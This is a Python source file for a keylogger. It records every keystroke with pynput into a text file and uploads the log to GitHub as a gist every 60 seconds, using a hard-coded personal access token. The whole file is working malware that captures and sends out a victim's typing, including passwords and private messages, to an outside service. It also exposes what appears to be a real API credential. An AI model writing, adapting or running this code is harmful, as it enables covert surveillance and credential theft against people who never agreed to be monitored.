import os
from pynput import keyboard
import requests
import time

# Define the file path for the key log
#path = os.environ['appdata'] + '\\output.txt'
path = 'output.txt'

# Define a function to write key presses to a file
def write_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    with open(path, 'a') as file:
        if letter.find('backspace') > 0:
            file.write(' BACKSPACE ')
        elif letter.find('enter') > 0:
            file.write('\n')
        elif letter.find('shift') > 0:
            file.write(' SHIFT ')
        elif letter.find('space') > 0:
            file.write(' ')
        elif letter.find('caps_lock') > 0:
            file.write(' CAPS_LOCK ')
        elif letter.find('Key'):	
            file.write(letter)

# Define a function for creating gist
def create_gist(api_token, file_name, file_content):
    url = 'https://api.github.com/gists'
    headers = {
        'Authorization': f'token {api_token}'
    }
    files = {file_name: {'content': file_content}}

    response = requests.post(url, headers=headers, json={'files': files})

    if response.status_code == 201:
        return response.json()['html_url']
    else:
        return None

# Replace with your GitHub personal access token
api_token = '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'

# Start the keyboard listener
with keyboard.Listener(on_press=write_file) as listener:
    while True:
        # Read file content if the file exists
        if os.path.exists(path):
            with open(path, 'r') as file:
                file_content = file.read()
        else:
            file_content = ''

        # Create Gist only if file content is available
        if file_content:
            gist_url = create_gist(api_token, path, file_content)

            if gist_url is not None:
                print(f'Gist created: {gist_url}')
            else:
                print('Failed to create Gist.')

            # Clear the content of the file after sending to prevent duplication
            # open(path, 'w').close()

        # Wait for 1 minute before sending data again
        time.sleep(60)
